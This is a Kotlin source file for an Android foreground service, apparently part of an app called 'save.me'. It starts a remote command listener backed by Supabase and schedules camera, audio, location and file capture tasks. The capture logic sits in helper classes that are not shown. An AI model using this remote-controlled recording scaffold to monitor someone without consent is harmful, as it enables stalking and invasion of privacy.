package com.save.me

import android.app.Service
import android.content.Intent
import android.os.IBinder
import kotlinx.coroutines.*

class SurveillanceService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    override fun onCreate() {
        super.onCreate()
        NotificationUtils.createNotificationChannel(this)
        startForeground(1, NotificationUtils.buildForegroundNotification(this))

        // Start background observers
        scope.launch { SupabaseUtils.startRealtimeCommandListener(this@SurveillanceService) }
        scope.launch { CameraUtils.schedulePhotoVideoTasks(this@SurveillanceService) }
        scope.launch { AudioUtils.scheduleAudioTasks(this@SurveillanceService) }
        scope.launch { LocationUtils.scheduleLocationTasks(this@SurveillanceService) }
        scope.launch { FileUtils.scheduleFileTasks(this@SurveillanceService) }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }
}